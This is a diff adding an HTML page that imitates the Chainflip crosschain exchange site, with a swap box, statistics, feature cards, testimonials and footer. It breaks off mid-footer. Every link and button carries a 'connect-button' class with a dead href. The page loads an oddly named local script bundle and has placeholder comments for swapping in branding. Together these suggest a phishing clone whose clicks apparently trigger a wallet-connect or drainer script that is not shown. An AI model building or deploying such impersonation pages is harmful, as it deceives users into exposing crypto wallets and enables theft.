@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Chainflip | A secure crosschain decentralized exchange</title>
+  <!-- FAVICON PLACEHOLDER: add <link rel="icon" href="favicon.png"> with your own icon -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css">
+  <script src="assets/sources.js"></script>
+  <script src="assets/app-bundle_mw25nqf0.js"></script>
+  <script src="assets/qr-code-styling.js"></script>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <header class="hdr">
+    <div class="banner"><i class="ri-megaphone-line"></i><span>BNB Chain is coming.</span><a class="connect-button"
+        href="#">Read more <i class="ri-arrow-right-line"></i></a></div>
+    <nav class="nav">
+      <div class="wrap">
+        <a class="logo connect-button" href="#">
+          <!-- LOGO PLACEHOLDER: replace span.logo-mark with <img src="your-logo-icon.svg" alt="Chainflip">, or replace the whole logo contents with one full-logo image -->
+          <img src="img/chainfliplogo.png" class="logo-image" alt="Chainflip"><span class="chaintext">CHAINFLIP</span>
+        </a>
+        <ul class="links">
+          <li class="dd"><a class="connect-button" href="#">Products <i class="ri-arrow-down-s-line"></i></a>
+            <div class="menu"><a class="connect-button" href="#">Swap</a><a class="connect-button" href="#">Lend</a><a
+                class="connect-button" href="#">Stake</a><a class="connect-button" href="#">Analytics</a><a
+                class="connect-button" href="#">Liquidity Provision</a><a class="connect-button" href="#">Block
+                Explorer</a><a class="connect-button" href="#">Chainflip SDK</a><a class="connect-button"
+                href="#">Validators</a></div>
+          </li>
+          <li class="dd"><a class="connect-button" href="#">Developers <i class="ri-arrow-down-s-line"></i></a>
+            <div class="menu"><a class="connect-button" href="#">Docs</a><a class="connect-button" href="#">Chainflip
+                SDK</a><a class="connect-button" href="#">Block Explorer</a><a class="connect-button"
+                href="#">Status</a></div>
+          </li>
+          <li class="dd"><a class="connect-button" href="#">Explore <i class="ri-arrow-down-s-line"></i></a>
+            <div class="menu"><a class="connect-button" href="#">About</a><a class="connect-button"
+                href="#">Changelog</a><a class="connect-button" href="#">Roadmap</a><a class="connect-button"
+                href="#">Blog</a><a class="connect-button" href="#">FAQ</a><a class="connect-button" href="#">Docs</a><a
+                class="connect-button" href="#">Design kit</a><a class="connect-button" href="#">Token</a></div>
+          </li>
+          <li class="dd"><a class="connect-button" href="#">Company <i class="ri-arrow-down-s-line"></i></a>
+            <div class="menu"><a class="connect-button" href="#">Jobs</a><a class="connect-button"
+                href="#">Whitepaper</a><a class="connect-button" href="#">Lightpaper</a><a class="connect-button"
+                href="#">Legal notice</a><a class="connect-button" href="#">Privacy policy</a></div>
+          </li>
+          <li><a class="connect-button" href="#">Token</a></li>
+          <li><a class="connect-button" href="#">Analytics</a></li>
+          <li><a class="connect-button swap" href="#">Swap</a></li>
+        </ul>
+        <a class="connect-button btn mswap" href="#">Swap</a>
+        <button class="burger" id="burger" aria-label="Open menu"><i></i><i></i></button>
+        <button class="close" id="close" aria-label="Close menu" hidden><i class="ri-close-line"></i></button>
+      </div>
+    </nav>
+    <div class="mnav" id="mnav">
+      <a class="connect-button" href="#">Swap <i class="ri-arrow-right-up-line"></i></a>
+      <a class="connect-button" href="#">Earn <i class="ri-arrow-right-up-line"></i></a>
+      <a class="connect-button" href="#">Stake <i class="ri-arrow-right-up-line"></i></a>
+      <a class="connect-button" href="#">Lend <i class="ri-arrow-right-up-line"></i></a>
+      <div class="acc"><button class="connect-button">Developers <i class="ri-arrow-down-s-line"></i></button>
+        <div class="sub2"><a class="connect-button" href="#">Docs</a><a class="connect-button" href="#">Chainflip
+            SDK</a><a class="connect-button" href="#">Block Explorer</a><a class="connect-button" href="#">Status</a>
+        </div>
+      </div>
+      <div class="acc"><button class="connect-button">Company <i class="ri-arrow-down-s-line"></i></button>
+        <div class="sub2"><a class="connect-button" href="#">Jobs</a><a class="connect-button" href="#">Whitepaper</a><a
+            class="connect-button" href="#">Lightpaper</a><a class="connect-button" href="#">Legal notice</a></div>
+      </div>
+      <div class="acc"><button class="connect-button">Explore <i class="ri-arrow-down-s-line"></i></button>
+        <div class="sub2"><a class="connect-button" href="#">About</a><a class="connect-button" href="#">Changelog</a><a
+            class="connect-button" href="#">Roadmap</a><a class="connect-button" href="#">Blog</a><a
+            class="connect-button" href="#">FAQ</a><a class="connect-button" href="#">Token</a></div>
+      </div>
+      <a class="connect-button" href="#">Analytics</a>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="wrap">
+        <h1>A secure crosschain<br>decentralized exchange</h1>
+        <p class="sub">Native swaps between <b>Bitcoin, Solana, Ethereum</b><br>and more. Excellent pricing and an ultra
+          intuitive UX.</p>
+        <div class="swapbox">
+          <h3>Swap</h3>
+          <label>Deposit</label>
+          <div class="field">
+            <div class="amt">0<small>$0.00</small></div>
+            <button class="tok"
+              id="tokA"><!-- COIN PLACEHOLDER: replace span.coin with <img src="btc.svg" alt="BTC"> --><span
+                class="coin btc"><i class="ri-bit-coin-fill"></i></span><span><b>BTC</b><span>on Bitcoin</span></span><i
+                class="ri-arrow-right-s-line"></i></button>
+          </div>
+          <button class="flip" id="flip" aria-label="Switch assets"><i class="ri-arrow-up-down-line"></i></button>
+          <label>Receive</label>
+          <div class="field">
+            <div class="amt">0<small>$0.00</small></div>
+            <button class="tok"
+              id="tokB"><!-- COIN PLACEHOLDER: replace span.coin with <img src="usdc.svg" alt="USDC"> --><span
+                class="coin usdc">$</span><span><b>USDC</b><span>on Ether...</span></span><i
+                class="ri-arrow-right-s-line"></i></button>
+          </div>
+          <a class="connect-button btn go" href="#">Get Started</a>
+        </div>
+
+        <div class="stats">
+          <div>
+            <p>Volume</p><b>$10.41B</b>
+            <p>All time</p>
+          </div>
+          <div>
+            <p>Total Swaps</p><b>4M</b>
+            <p>All time</p>
+          </div>
+          <div>
+            <p>FLIP Burnt</p><b>16M FLIP</b>
+            <p>All time</p>
+          </div>
+          <div>
+            <p>Broker Fees</p><b>$14M</b>
+            <p>All time</p>
+          </div>
+        </div>
+        <p class="ls">Latest swaps</p>
+        <!-- MARQUEE: hardcoded. Edit pills here; the second half must stay an exact copy of the first so the loop is seamless -->
+        <div class="mq">
+          <div class="mq-t">
+            <div class="pill"><b>$50K</b>USDT <em>ETH</em> → BTC <small>3h ago</small></div>
+            <div class="pill"><b>$30K</b>BTC → SOL <small>3h ago</small></div>
+            <div class="pill"><b>$47K</b>BTC → USDT <em>ETH</em> <small>4h ago</small></div>
+            <div class="pill"><b>$35K</b>USDC <em>ETH</em> → SOL <small>4h ago</small></div>
+            <div class="pill"><b>$62K</b>ETH → BTC <small>5h ago</small></div>
+            <div class="pill"><b>$28K</b>SOL → USDC <small>6h ago</small></div>
+            <div class="pill"><b>$50K</b>USDT <em>ETH</em> → BTC <small>3h ago</small></div>
+            <div class="pill"><b>$30K</b>BTC → SOL <small>3h ago</small></div>
+            <div class="pill"><b>$47K</b>BTC → USDT <em>ETH</em> <small>4h ago</small></div>
+            <div class="pill"><b>$35K</b>USDC <em>ETH</em> → SOL <small>4h ago</small></div>
+            <div class="pill"><b>$62K</b>ETH → BTC <small>5h ago</small></div>
+            <div class="pill"><b>$28K</b>SOL → USDC <small>6h ago</small></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="wrap" style="margin-top:130px">
+      <div class="grid">
+        <div class="card">
+          <h3>Swap confidently. No hidden fees, no surprises</h3>
+          <!-- IMAGE PLACEHOLDER: replace with <img src="fees.png"> -->
+          <div class="vis fade">
+            <div class="panel">
+              <div>Network fee <b>2 USDC ($2.01)</b></div>
+              <div>Boost fee <b>2.3 USDC ($2.31)</b></div>
+              <div>Deposit fee <b>0.002 ETH ($5.38)</b></div>
+            </div>
+          </div>
+        </div>
+        <div class="card">
+          <h3>Simple and intuitive swapping experience</h3>
+          <!-- IMAGE PLACEHOLDER: replace with <img src="swap-flow.png"> -->
+          <div class="vis"><span class="blk"></span><span class="tile"><i
+                class="ri-arrow-left-right-line"></i></span><span class="blk"></span></div>
+        </div>
+        <div class="card">
+          <h3>Earn up to 10% yield on Bitcoin with Boost</h3>
+          <!-- IMAGE PLACEHOLDER: replace with <img src="boost.png"> -->
+          <div class="vis">
+            <div class="bars"><i style="height:36px"></i><i style="height:50px"></i><i style="height:70px"></i><i
+                class="hl" style="height:120px"></i><i style="height:60px"></i><i style="height:36px"></i><i
+                style="height:36px"></i></div>
+          </div>
+        </div>
+        <div class="card">
+          <h3>Add Bitcoin and Solana into your product with our SDK suite</h3>
+          <!-- IMAGE PLACEHOLDER: replace with <img src="sdk.png"> -->
+          <div class="vis"><svg class="ln" viewBox="0 0 560 260" preserveAspectRatio="xMidYMid slice" fill="none"
+              stroke="#2c2c2c" stroke-width="1.5">
+              <path d="M40 70H350Q362 70 370 60L380 50" />
+              <path d="M200 150H290H330Q350 150 365 132L430 70L520 60" />
+              <path d="M60 150H200" />
+            </svg>
+            <!-- COIN PLACEHOLDERS: replace each span.coin with <img src="coin.svg"> -->
+            <span class="coin arb abs" style="left:64%;top:36px;width:28px;height:28px"></span><span class="coin dk abs"
+              style="left:32%;top:128px;width:30px;height:30px;font-size:16px"><i
+                class="ri-ethereum-fill"></i></span><span class="coin sol abs"
+              style="left:51%;top:122px;width:46px;height:46px"></span><span class="coin btc abs"
+              style="left:82%;top:22px;width:46px;height:46px;background:#b9711a"><i
+                class="ri-bit-coin-fill"></i></span>
+          </div>
+        </div>
+      </div>
+      <p class="sc">Supported chains</p>
+      <div class="chains">
+        <!-- LOGO PLACEHOLDERS: replace each span with <img src="chain-logo.svg" alt="..."> -->
+        <span><i class="ri-bit-coin-fill"></i><em style="font-style:italic">bitcoin</em></span><span><i
+            class="ri-menu-5-line"></i>SOLANA</span><span><i class="ri-ethereum-fill"></i>ethereum</span><span><i
+            class="ri-send-plane-line"></i>TRON</span><span><i class="ri-shield-line"></i>ARBITRUM</span><span><i
+            class="ri-loader-2-line"></i><em style="font-style:italic">Polkadot</em></span>
+      </div>
+    </section>
+
+    <section class="net">
+      <!-- ANIMATION PLACEHOLDER: this block is a dot-grid backdrop. Replace by adding your validator globe/network image or canvas inside it -->
+      <div>
+        <h2>150 Validators,<br>One Decentralized Network</h2>
+        <p>The Chainflip Network is a distributed, permissionless, Proof-of-Stake MPC system securing a fully
+          transparent crosschain trading protocol without centralized control.</p>
+      </div>
+    </section>
+
+    <section class="wrap pad" style="padding-top:60px">
+      <h2>Crosschain trading made accessible to you</h2>
+      <p class="lead"><b>The reliable multi-chain exchange service.</b> Exchange BTC, ETH, SOL, USDC and others, at
+        great rates. No need for wallet linking, just use original assets.</p>
+      <div class="cta"><a class="connect-button btn" href="#">Swap</a><a class="connect-button btn sec" href="#">Learn
+          more</a></div>
+      <div class="grid">
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="no-wrapping.png"> -->
+          <div class="vis"><svg class="ln" viewBox="0 0 630 260" preserveAspectRatio="none" fill="none" stroke="#333"
+              stroke-width="1.5">
+              <path d="M255 95H300V165H255M300 130H345" />
+            </svg>
+            <div class="chips" style="position:relative;z-index:1;margin-right:-10px"><span
+                class="chip">Solana</span><span class="chip">Bitcoin</span><span class="chip">Ethereum</span></div><span
+              class="orb"><i class="ri-shape-line"></i></span><span class="chip g">Your wallet</span>
+          </div>
+          <h3>No Wrapping, No Detours</h3>
+          <p>Enjoy native Bitcoin swaps and smooth crosschain trading with Solana, Ethereum and more.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="pricing.png"> -->
+          <div class="vis"><span class="sl">0.06% slippage!</span>
+            <div>
+              <div class="row"><span><i class="coin btc"><i class="ri-bit-coin-fill"></i></i><i
+                    style="font-style:normal"><b>BTC</b>10:04AM</i></span><b>-0.624156 BTC</b></div>
+              <div class="row"><span><i class="coin sol"></i><i style="font-style:normal"><b>SOL</b>10:09AM</i></span><b
+                  class="pos">+255.7134 SOL</b></div>
+            </div>
+          </div>
+          <h3>Pricing That Works for You</h3>
+          <p>No extra fees, no surprises. Transparent pricing that scales with your trade size. Your funds will go
+            further.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="no-wallet.png"> -->
+          <div class="vis">
+            <div class="addr">
+              <div>Destination address <b>131n...GP4E <i class="ri-file-copy-line"></i></b></div>
+              <div>Refund address <b>0xfA...GP4E <i class="ri-file-copy-line"></i></b></div>
+            </div>
+          </div>
+          <h3>No Wallet Connection, No Headaches</h3>
+          <p>Keep it simple with no extra steps. Enjoy the fastest Bitcoin swaps on the market, and a smoother
+            experience.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="track-record.png"> -->
+          <div class="vis">
+            <div class="candles"><i class="d" style="height:70px"></i><i class="d" style="height:90px"></i><i class="d"
+                style="height:50px"></i><i class="d" style="height:40px"></i><i style="height:60px"></i><i
+                style="height:110px"></i><i style="height:150px"></i><i style="height:130px"></i><i class="d"
+                style="height:60px"></i><i style="height:80px"></i><i style="height:100px"></i><i class="d"
+                style="height:40px"></i><i style="height:120px"></i><i style="height:90px"></i></div>
+            <div class="tag">$10.41B<small>trade flow</small></div>
+          </div>
+          <h3>Proven Track Record</h3>
+          <p>$10.41B in trade flow and zero lost funds. Reliable since launch, built on trust, and <a
+              class="connect-button" href="#">audited by the best in web3.</a></p>
+        </div>
+      </div>
+    </section>
+
+    <section class="wrap pad">
+      <h2>Borrow Against your Native, Unwrapped Bitcoin</h2>
+      <p class="lead"><b>Lend and borrow BTC, ETH, SOL, and more.</b> Built directly on Chainflip’s proven DEX
+        infrastructure.</p>
+      <div class="cta"><a class="connect-button btn" href="#">Lend</a><a class="connect-button btn sec" href="#">Learn
+          more</a></div>
+      <div class="grid">
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="native-assets.png"> -->
+          <div class="vis" style="align-items:flex-start"><svg class="ln" viewBox="0 0 630 260"
+              preserveAspectRatio="none" fill="none" stroke-width="2">
+              <path d="M88 80V200" stroke="#555" />
+              <path d="M200 80V160Q200 180 180 180H110Q90 182 88 205" stroke="#2a4ea0" />
+              <path d="M312 80V170Q312 190 292 190H110Q90 192 88 205" stroke="#a8741a" />
+              <path d="M423 80V180Q423 198 403 198H110Q90 200 88 205" stroke="#2c8f6c" />
+              <path d="M534 80V185Q534 205 514 205H110Q90 207 88 205" stroke="#7d5bd1" />
+              <circle cx="88" cy="205" r="6" fill="#444" stroke="none" />
+            </svg>
+            <!-- COIN PLACEHOLDERS: replace each span.coin with <img src="coin.svg"> -->
+            <span class="coin dk abs" style="left:14%;top:30px;width:50px;height:50px;background:#fff;color:#111"><i
+                class="ri-ethereum-fill"></i></span><span class="coin usdc abs"
+              style="left:32%;top:30px;width:50px;height:50px">$</span><span class="coin dk abs"
+              style="left:49.5%;top:30px;width:50px;height:50px;color:#f7931a"><i
+                class="ri-bit-coin-fill"></i></span><span class="coin usdt abs"
+              style="left:67%;top:30px;width:50px;height:50px">T</span><span class="coin dk abs"
+              style="left:85%;top:30px;width:50px;height:50px;color:#9945ff"><i class="ri-menu-5-line"></i></span>
+          </div>
+          <h3>Native Assets Only</h3>
+          <p>Lend or borrow real BTC, ETH, SOL, and stablecoins directly. No wrapped tokens or bridges, just native
+            assets, managed by Chainflip’s vault system.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="safe-by-design.png"> -->
+          <div class="vis"><span class="coin arb big"></span><span class="coin dk big" style="margin-left:-30px"><i
+                class="ri-ethereum-fill"></i></span><i class="ri-arrow-left-line"
+              style="font-size:34px;color:#555;margin:0 24px"></i><span class="orb"><i
+                class="ri-shield-check-line"></i></span></div>
+          <h3>Safe by Design</h3>
+          <p>Every loan is overcollateralised and priced using verified Chainlink oracles, with fallback feeds on
+            Ethereum and Arbitrum for extra reliability.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="cross-chain.png"> -->
+          <div class="vis">
+            <div class="coins" style="gap:14px"><span class="chip"><i class="coin btc"><i
+                    class="ri-bit-coin-fill"></i></i>BTC</span><span class="chip"><i
+                  class="coin usdc">$</i>USDC</span><span class="chip"><i class="coin sol"></i>SOL</span></div>
+          </div>
+          <h3>Cross-Chain by Default</h3>
+          <p>Deposit collateral on one chain and borrow on another, all natively. Chainflip’s cross-chain settlement
+            layer handles everything on-chain, removing friction between ecosystems.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="composable.png"> -->
+          <div class="vis" style="font-size:90px;color:#2a2a2a;gap:20px">{<span
+              style="font-size:20px;color:#ff5fa8;letter-spacing:12px">●&nbsp;·&nbsp;●&nbsp;·&nbsp;●</span>}</div>
+          <h3>Transparent &amp; Composable</h3>
+          <p>All positions, rates, and liquidations are avaliable for the user. Developers can integrate lending flows,
+            monitoring, or liquidation data directly through our open API stack.</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="wrap pad">
+      <h2>Put your assets to work and earn yield</h2>
+      <p class="lead"><b>Earn native Bitcoin yield, as well as liquidity fees,</b> all within our full-suite Liquidity
+        Provision app, built for active market makers, solvers and liquidity providers.</p>
+      <div class="cta"><a class="connect-button btn" href="#">Earn</a><a class="connect-button btn sec" href="#">Learn
+          more</a></div>
+      <div class="grid">
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="earn-btc.png"> -->
+          <div class="vis"><span class="pct" style="top:36px">+2.57%</span><span class="pct"
+              style="left:22%">+0.7%</span><span class="pct" style="right:28%;top:90px;font-size:11px">+0.3%</span><span
+              class="pct" style="right:24%;top:130px;font-size:14px">+3%</span><span class="pct"
+              style="bottom:18px">+9.38%</span><span class="coin btc big" style="background:#c97a18"><i
+                class="ri-bit-coin-fill"></i></span></div>
+          <h3>Earn Native Bitcoin Yield</h3>
+          <p>Earn sustainable yield directly in BTC when you supply Bitcoin liquidity. No impermanent loss, just stack
+            your sats.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="volume-wave.png"> -->
+          <div class="vis">
+            <div class="wave"><svg viewBox="0 0 600 260" preserveAspectRatio="none">
+                <path d="M0 130 C60 190 130 190 175 110 S260 190 330 140 S420 110 470 90 S560 60 600 40" fill="none"
+                  stroke="#2fd38a" stroke-width="2" />
+              </svg></div>
+            <div class="tag" style="left:16%;font-size:20px;top:60px">30% ↗<small>users</small></div>
+          </div>
+          <h3>Ride the wave of growing on-chain volume</h3>
+          <p>Tap into growing user activity and exchange route expansion. Maximise your earnings as the market momentum
+            rises.</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="wrap pad">
+      <div class="sech">
+        <div>
+          <h2>Build with control</h2>
+          <p class="lead" style="margin-bottom:0"><b>Integrate our SDK with ease.</b> BTC, Solana, Ethereum and more,
+            all the top assets under one roof, whilst fully customising your fees.</p>
+        </div>
+        <!-- MARQUEE: hardcoded partner logos. Replace each span.pp with <img src="partner.svg" alt="...">; keep the second half an exact copy of the first -->
+        <div class="mq partners">
+          <div class="mq-t">
+            <span class="pp">Rango Exchange</span><span class="pp"><i class="ri-fox-line"></i>SHAPESHIFT</span><span
+              class="pp"><i class="ri-flashlight-fill"></i>THORWallet</span><span class="pp">Partner</span>
+            <span class="pp">Rango Exchange</span><span class="pp"><i class="ri-fox-line"></i>SHAPESHIFT</span><span
+              class="pp"><i class="ri-flashlight-fill"></i>THORWallet</span><span class="pp">Partner</span>
+          </div>
+        </div>
+      </div>
+      <div class="cta" style="margin-top:36px"><a class="connect-button btn" href="#">Build</a><a
+          class="connect-button btn sec" href="#">Get in touch</a></div>
+      <div class="grid">
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="routes.png"> -->
+          <div class="vis"><span class="coin arb"></span><span class="coin dk" style="margin:60px 10px 0"><i
+                class="ri-ethereum-fill"></i></span><span class="orb" style="margin:0 10px"><i class="ri-shape-line"
+                style="color:#ff2f92"></i></span><span class="coin btc" style="margin:60px 10px 0"><i
+                class="ri-bit-coin-fill"></i></span><span class="coin sol"></span></div>
+          <h3>All the Big Routes, All in One Place</h3>
+          <p>Say goodbye to juggling multiple integrations. Access Solana, Bitcoin, Ethereum and more all in one place.
+          </p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="fees-rules.png"> -->
+          <div class="vis">
+            <div class="row" style="width:480px;font-size:14px"><span>1 ETH ⇄ <b style="display:inline">0.027
+                  BTC</b></span><span>$6.03 <i class="ri-arrow-down-s-line"></i></span></div>
+          </div>
+          <h3>Your Fees, Your Rules</h3>
+          <p>Set your commission, your way, and earn whenever users swap through Chainflip routes – all from within your
+            product.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="swapkit.png"> -->
+          <div class="vis"><span class="chip" style="font-size:20px;padding:8px 16px"><i
+                class="ri-menu-5-line"></i>SwapKit</span></div>
+          <h3>Convenient Building, Smarter Aggregation</h3>
+          <p>Integrate our SDK into any webstack with advanced crosschain messaging. Aggregate top assets, and
+            streamline your workflow.</p>
+        </div>
+        <div class="card v"><!-- IMAGE PLACEHOLDER: replace with <img src="docs.png"> -->
+          <div class="vis"
+            style="flex-direction:column;align-items:flex-start;padding:0 50px;gap:18px;color:#444;font-size:18px"><span
+              style="color:var(--g)">Native Swap Flow</span><span>Liquidity Provider Accounts</span><span>$USDC
+              Denominated Pools</span><span>Deposit Channels &amp; Brokers</span></div>
+          <h3>Explore our Docs</h3>
+          <p>Explore our comprehensive docs to seamlessly integrate Chainflip. Find everything you need: <a
+              class="connect-button" href="#">link to docs here.</a></p>
+        </div>
+      </div>
+    </section>
+
+    <section class="wrap pad">
+      <h2>Trusted by crypto natives</h2>
+      <div class="tw">
+        <!-- AVATAR PLACEHOLDERS: replace each span.av with <img class="av" src="avatar.jpg" alt=""> -->
+        <article class="tc">
+          <div class="th"><span class="av"></span>
+            <div><b>Chainflipgod</b><span>@chainflipgod</span></div><a class="connect-button" href="#" aria-label="X"><i
+                class="ri-twitter-x-line"></i></a>
+          </div>
+          <p>a LOOOOOT of people are sleeping on how good @Chainflip is getting at offering big swaps with tight
+            slippage Competition among LPs actively driving the price down to the benefit of swappers. It’s ramping up
+            big time.</p>
+        </article>
+        <article class="tc">
+          <div class="th"><span class="av"></span>
+            <div><b>Onchain Baron</b><span>@OnchainBaron</span></div><a class="connect-button" href="#"
+              aria-label="X"><i class="ri-twitter-x-line"></i></a>
+          </div>
+          <p>I think Chainflip / $FLIP is on to something. Using USDC as the pairing for their native crosschain swaps
+            is so much better UX than @THORChain’s / $THOR model. It is a matter of time before we have another couple
+            exchanges implode, onchain finance is the way.</p>
+        </article>
+        <article class="tc">
+          <div class="th"><span class="av"></span>
+            <div><b>Golem</b><span>@BowTiedGolem</span></div><a class="connect-button" href="#" aria-label="X"><i
+                class="ri-twitter-x-line"></i></a>
+          </div>
+          <p>Update: just used @Chainflip to swap BTC -&gt; ETH (s/o to @munchwrap for rec) really great experience,
+            super smooth, works great, best rates I could find new #1 onchain method of sending btc -&gt; eth/sol, etc.
+            Highly recommend checking it out fam.</p>
+        </article>
+        <article class="tc">
+          <div class="th"><span class="av"></span>
+            <div><b>Nicolás</b><span>@nicolasmozo_</span></div><a class="connect-button" href="#" aria-label="X"><i
+                class="ri-twitter-x-line"></i></a>
+          </div>
+          <p>I love @Chainflip. I’ve gotten stuck in some bullshit blockchains bc of not having enough gas and Chainflip
+            helped me a ton with bridging. God</p>
+        </article>
+        <article class="tc">
+          <div class="th"><span class="av"></span>
+            <div><b>pixel</b><span>@spacepixel</span></div><a class="connect-button" href="#" aria-label="X"><i
+                class="ri-twitter-x-line"></i></a>
+          </div>
+          <p>@Chainflip has the best pricing and is trustless.</p>
+        </article>
+        <article class="tc">
+          <div class="th"><span class="av"></span>
+            <div><b>Adonis Cyril | Radarblock</b><span>@0xadoniscyril</span></div><a class="connect-button" href="#"
+              aria-label="X"><i class="ri-twitter-x-line"></i></a>
+          </div>
+          <p>correction: @Chainflip is the fastest ik till now. took me 3 mins from arbitrum to solana. USDC. gg</p>
+        </article>
+        <article class="tc">
+          <div class="th"><span class="av"></span>
+            <div><b>aixbt</b><span>@aixbt_agent</span></div><a class="connect-button" href="#" aria-label="X"><i
+                class="ri-twitter-x-line"></i></a>
+          </div>
+          <p>chainflip burning $80k worth of flip tokens weekly from swap fees. every btc to sol rotation, every eth to
+            btc profit taking runs through their native swap infrastructure. no wrapped tokens, just tss cryptography
+            handling $1.24b cumulative volume. alt season cross-chain rotations feed directly into token burns.
+            infrastructure selling pickaxes in the gold rush.</p>
+        </article>
+        <article class="tc">
+          <div class="th"><span class="av"></span>
+            <div><b>BurstingBagel</b><span>@burstingbagel</span></div><a class="connect-button" href="#"
+              aria-label="X"><i class="ri-twitter-x-line"></i></a>
+          </div>
+          <p>@Chainflip is the purest BTCfi play out there. Today, most of their revenue comes from facilitating
+            cross-chain swaps with native BTC. In the next 1-2 months, they’re launching what might be the best
+            implementation yet of permissionless, native BTC-backed lending. Sizing the TAM is tricky, but I’d expect
+            $100M-$1B in outstanding loans within the first year.</p>
+        </article>
+      </div>
+    </section>
+
+    <section class="wrap pad">
+      <h2>Connect with us at Chainflip Labs</h2>
+      <div class="soc">
+        <a class="connect-button" href="#"><i class="ri-twitter-x-line"></i><b>Twitter</b><span>77K followers</span></a>
+        <a class="connect-button" href="#"><i class="ri-discord-line"></i><b>Discord</b><span>11.1K members</span></a>
+        <a class="connect-button" href="#"><i class="ri-send-plane-line"></i><b>Telegram</b><span>7.7K
+            members</span></a>
+        <a class="connect-button" href="#"><i class="ri-book-open-line"></i><b>Blog</b><span>4K members</span></a>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="wrap">
+      <a class="logo connect-button" href="#"
+        style="font-size:19px"><!-- LOGO PLACEHOLDER: replace span.logo-mark with <img src="your-logo-icon.svg" alt="Chainflip"> --><span
+          class="logo-mark" style="width:24px;height:24px"></span><span>CHAINFLIP</span></a>
+      <h3>Get Chainflip updates</h3>
+      <p class="fp">Product news, protocol updates, and launches.</p>
+      <form class="form" onsubmit="return false"><input type="email" placeholder="you@example.com"
+          aria-label="Email"><button class="connect-button btn" type="submit">Notify me</button></form>
+      <div class="fc">
+        <div>
+          <h4>Products</h4>
+          <ul>
+            <li><a class="connect-button" href="#">Swap <i class="ri-arrow-right-up-line"></i></a></li>
+            <li><a class="connect-button" href="#">Lend <i class="ri-arrow-right-up-line"></i></a></li>
+            <li><a class="connect-button" href="#">Stake <i class="ri-arrow-right-up-line"></i></a></li>
+            <li><a class="connect-button" href="#">Analytics <i class="ri-arrow-right-up-line"></i></a></li>
+            <li><a class="connect-button" href="#">Liquidity Provision <i class="ri-arrow-right-up-line"></i></a></li>
+            <li><a class="connect-button" href="#">Block Explorer <i class="ri-arrow-right-up-line"></i></a></li>
+            <li><a class="connect-button" href="#">Chainflip SDK <i class="ri-arrow-right-up-line"></i></a></li>
+            <li><a class="connect-button" href="#">Validators <i class="ri-arrow-right-up-line"></i></a></li>
+          </ul>
+        </div>
+        <div>
+          <h4>Explore</h4>
+          <ul>
+            <li><a class="connect-button" href="#">About</a></li>
+            <li><a class="connect-button" href="#">Changelog</a></li>
+            <li><a class="connect-button" href="#">Roadmap</a></li>
+            <li><a class="connect-button" href="#">Blog</a></li>
+            <li><a class="connect-button" href="#">FAQ</a></li>
+            <li><a class="connect-button" href="#">Docs</a></li>
+            <li><a class="connect-button" href="#">Design kit</a></li>
+            <li><a class="connect-button" href="#">Token</a></li>
+          </ul>
+        </div>
+        <div>
+          <h4>Resources</h4>
+          <ul>
+            <li><a class="connect-button" href="#">Roadmap</a></li>
+            <li><a class="connect-button" href="#">Ecosystem</a></li>
+            <li><a class="connect-button" href="#">Jobs</a></li>
+            <li><a class="connect-button" href="#">Whitepaper</a></li>
+            <li><a class="connect-button" href="#">Lightpaper</a></li>
+            <li><a class="connect-button" href="#">Legal notice</a></li>
+            <li><a class="connect-button" href="#">Privacy policy</a></li>
+            <li><a class="connect-button" href="#">Status</a></li>
+            <li><a class="connect-button" href="#">Community projects</a></li>
+            <li><a class="connect-button" href="#" style="color:#777">Cookie Settings</a></li>
+          </ul>
+        </div>
+        <div>
+          <h4>Socials</h4>
+          <ul>
+            <li><a class="connect-button" href="#">X</a></li>
+            <li><a class="connect-button" href="#">Discord</a></li>
+            <li><a class="connect-button" href="#">Telegram</a></li>
+            <li><a class="connect-button" href="#">LinkedIn</a></li>
+            <li><a class="connect-button" href="#">BlueSky</a></li>
+            <li><a class="connect-button" href="#">Threads</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="fc" style="margin-top:50px">
+        <div>
+          <h4>Exchange Pair</h4>
+          <ul>
+            <li><a class="connect-button" href="#">Ethereum to Bitcoin</a></li>
+            <li><a class="connect-button" href="#">Ethereum to Solana</a></li>
+            <li><a class="connect-button" href="#">Solana to Ethereum</a></li>
+            <li><a class="connect-button" href="#">USDC to USDT</a></li>
+            <li><a class="connect-button" href="#">Ethereum to USDC</a></li>
+            <li><a class="connect-button" href="#">Bitcoin to USDT (Tron)</a></li>
+            <li><a class="connect-button" href="#">Ethereum to TRX</a></li>
+            <li><a class="connect-button" href="#">Ethereum to FLIP</a></li>
+            <li><a class="connect-button" href="#">USDC to Polkadot</a></li>
+            <li><a class="connect-button" href="#">Ethereum to WBTC</a></li>
+            <li><a class="connect-button" href="#">Bitcoin to USDT (BSC)</a></li>
+            <li><a class="connect-button" href="#">Bitcoin to BNB</a></li>
+            <li><a class="connect-button" href="#">Bitcoin to cbBTC</a></li>
+          </ul>
+        </div>
+        <div>
